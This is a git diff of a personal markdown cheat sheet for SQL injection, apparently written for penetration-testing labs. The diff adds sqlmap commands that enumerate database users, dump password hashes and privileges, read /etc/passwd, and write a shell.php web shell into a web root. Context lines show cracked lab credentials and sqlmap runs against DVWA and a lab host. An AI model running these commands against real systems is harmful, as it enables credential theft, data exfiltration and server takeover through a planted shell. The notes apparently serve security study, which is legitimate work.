@@ -173,6 +173,8 @@ img_path: /Cheatsheet/Web/SQLi/images
 	- User 3: Jake
 		- jake:@b_ENXkGYUCAv3zJ
 
+
+
 # Payload
 
 ## Enumerate NUMBER of columns
@@ -326,7 +328,7 @@ img_path: /Cheatsheet/Web/SQLi/images
 	```
 
 
-## Documentation
+# Documentation
 ```
 # var=''
 # echo -n $var | sed 's/,/\n/g'
@@ -376,6 +378,19 @@ marym:3kfs86sfd
 ```
 
 # SQLMAP 
+## Internal Data
+- Get internal data
+	```
+	sqlmap -r sqli.txt --output-dir=$(pwd)/sqlmap -p username --<option>
+	--current-user #Get current user
+	--is-dba #Check if current user is Admin
+	--hostname #Get hostname
+	--users #Get usernames od DB
+	--passwords #Get passwords of users in DB
+	--privileges #Get privileges
+	
+	```
+## DB Data
 1. Dump databases
 	```
 	sqlmap -r sqli.txt -p <parameter> --dbs --output-dir=$(pwd)/sqlmap
@@ -411,8 +426,12 @@ marym:3kfs86sfd
 	# w/o --form
 	sqlmap --url http://pinkys-palace:8080/littlesecrets-main/login.php --dbs --output-dir=$(pwd)/sqlmap
 	```
+8. [Read/Write file](https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/)
+	```
+	--file-read=/etc/passwd
+	--file-write=/root/Desktop/shell.php --file-dest=/xampp/htdocs/shell.php
+	```
 - Options
-
 	```
 	sqlmap -r sqli.txt --dump --output-dir=$(pwd)/sqlmap 
 
@@ -432,20 +451,19 @@ marym:3kfs86sfd
 		-C COL              DBMS database table column(s) to enumerate
 		-X EXCLUDE          DBMS database identifier(s) to not enumerate
 		-U USER             DBMS user to enumerate
+
 	```
-
 - Specify Headers
-
 	```
 	./sqlmap.py --headers="User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:25.0) Gecko/20100101 Firefox/25.0" --cookie="security=low; PHPSESSID=oikbs8qcic2omf5gnd09kihsm7" -u 'http://localhost/dvwa/vulnerabilities/sqli_blind/?id=1-BR&Submit=Submit#' --level=5 risk=3 -p id
 	```
 
-## Some Good Reference
+# Some Good Reference
 - https://pentest.tonyng.net/sql-injection-cheat-sheet/
 - https://www.youtube.com/watch?v=_Aa8125CQ0g
 - https://medium.com/@drag0n/sqlmap-tamper-scripts-sql-injection-and-waf-bypass-c5a3f5764cb3
 
+---
+Tags: #cheatsheet/web #exploit/sqli/database-enum 
 
-
-
-
+---
